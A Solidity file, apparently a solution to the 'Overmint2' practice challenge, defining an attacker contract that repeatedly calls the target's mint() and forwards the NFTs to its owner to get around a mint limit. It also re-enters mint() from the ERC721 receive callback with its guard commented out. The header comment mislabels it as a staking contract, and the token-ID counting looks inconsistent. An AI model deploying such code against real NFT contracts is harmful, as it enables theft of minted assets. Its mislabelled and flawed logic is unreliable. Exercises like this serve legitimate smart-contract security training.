/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint2} from "./Overmint2.sol";

/// @title Overmint2Attacker
/// @notice This contract manage NFT staking feature and its rewards
contract Overmint2Attacker is IERC721Receiver {
  Overmint2 public overmint;
  uint256 mintedNFTs;
  address owner;

  constructor(address _overmint2) {
    overmint = Overmint2(_overmint2);
    mintedNFTs = 1;
    owner = msg.sender;
  }

  /// @notice an Attack function to call Overmint2 mint() function
  function attack() external {
    // First mint() call
    (bool success1,) = address(overmint).call(abi.encodeWithSignature("mint()"));
    require(success1, "First mint() call failed");
    overmint.safeTransferFrom(address(this), owner, mintedNFTs);
    mintedNFTs++;

    // Second mint() call
    (bool success2,) = address(overmint).call(abi.encodeWithSignature("mint()"));
    require(success2, "Second mint() call failed");
    overmint.safeTransferFrom(address(this), owner, mintedNFTs);
    mintedNFTs++;

    // Third mint() call
    (bool success3,) = address(overmint).call(abi.encodeWithSignature("mint()"));
    require(success3, "Third mint() call failed");
    overmint.safeTransferFrom(address(this), owner, mintedNFTs);
    mintedNFTs++;

    // Fourth mint() call
    (bool success4,) = address(overmint).call(abi.encodeWithSignature("mint()"));
    require(success4, "Fourth mint() call failed");
    overmint.safeTransferFrom(address(this), owner, mintedNFTs);
    mintedNFTs++;

    // Fifth mint() call
    (bool success5,) = address(overmint).call(abi.encodeWithSignature("mint()"));
    require(success5, "Fifth mint() call failed");
    overmint.safeTransferFrom(address(this), owner, mintedNFTs);
    mintedNFTs++;
  }

  /**
   * @dev See {IERC721-onERC721Received}.
   */
  function onERC721Received(
    address, /* operator */
    address from,
    uint256 tokenId,
    bytes calldata /* data */
  ) external returns (bytes4) {
    mintedNFTs++;
    // if (mintedNFTs < 5) {
    overmint.mint();
    // }
    return IERC721Receiver.onERC721Received.selector;
  }
}
